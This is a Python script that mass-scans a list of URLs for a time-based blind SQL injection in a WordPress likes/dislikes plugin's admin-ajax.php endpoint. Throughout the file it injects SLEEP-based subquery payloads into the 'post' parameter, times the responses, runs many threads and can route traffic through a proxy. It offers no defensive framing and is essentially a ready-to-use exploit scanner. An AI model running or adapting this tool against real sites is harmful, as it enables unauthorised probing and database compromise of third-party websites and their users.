import argparse
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

lock = Lock()
completed = 0
total = 0
proxy_config = None

def test_sqli(url, fudge, timeout):
    global completed
    target = url.rstrip("/") + "/wp-admin/admin-ajax.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payloads = [5, 10]
    delays = []

    for duration in payloads:
        sleep_func = f"SLEEP({duration})"
        payload = f"action=my_likes_dislikes_action&post=1 AND (SELECT 1234 FROM (SELECT({sleep_func}))a)&state=like"

        try:
            start = time.time()
            requests.post(
                target,
                data=payload,
                headers=headers,
                timeout=timeout,
                proxies=proxy_config
            )
            elapsed = time.time() - start
            delays.append((sleep_func, elapsed))
        except:
            with lock:
                completed += 1
                print_progress()
            return

    all_valid = all(duration <= elapsed <= duration + fudge for duration, (_, elapsed) in zip(payloads, delays))

    if all_valid:
        print(f"\n[VULNERABLE] {url}")
        for sleep_func, elapsed in delays:
            print(f"  -> {sleep_func} triggered {elapsed:.2f}s delay")
        print()

    with lock:
        completed += 1
        print_progress()

def print_progress():
    print(f"\r[{completed} of {total} URL finished]", end='', flush=True)

def main():
    global total, proxy_config

    parser = argparse.ArgumentParser(description="Time-Based SQLi Checker (Clean, Threaded, Proxy-Support)")
    parser.add_argument('--file', required=True, help='File with base URLs (e.g. http://example.com)')
    parser.add_argument('--fudge', type=int, default=2, help='Extra time allowance for delay detection')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
    parser.add_argument('--threads', type=int, default=10, help='Number of concurrent threads')
    parser.add_argument('--proxy', help='Proxy to use (e.g. 5.5.5.5:8080)')

    args = parser.parse_args()

    # Set proxy if provided
    if args.proxy:
        proxy_config = {
            "http": f"http://{args.proxy}",
            "https": f"http://{args.proxy}"
        }

    try:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read file: {e}")
        return

    total = len(urls)
    print("We launched scan")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(test_sqli, url if url.startswith("http") else "http://" + url, args.fudge, args.timeout)
            for url in urls
        ]
        for _ in as_completed(futures):
            pass  # Output handled in thread

    print("\nScan complete.")

if __name__ == "__main__":
    main()
